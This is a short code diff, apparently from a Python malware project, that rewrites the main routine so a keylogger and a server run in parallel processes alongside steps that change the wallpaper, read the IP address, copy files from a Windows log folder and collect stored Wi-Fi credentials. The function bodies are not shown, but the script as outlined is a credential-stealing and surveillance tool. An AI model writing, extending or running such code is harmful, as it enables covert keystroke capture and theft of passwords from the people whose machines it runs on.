@@ -85,15 +85,23 @@ def key_logger():
     
 
 def main():
+    from multiprocessing import Process
+    multiprocessing.freeze_support()
+    p1 = Process(target = run_server)
+    print("server running")
+    p1.start()
+    p2 = Process(target = key_logger)
+    print("logger running")
+    p2.start()
+    
     dir_create()
     print("Directory successfully created")
     background()
     print("Wallpaper successfully applied")
     ip_address()
-    key_logger()
     copy_file("C:/WindowsLogs/","C:/test/")
     wifi_creds()
-    run_server()
+    
     
 
 if __name__ == "__main__":
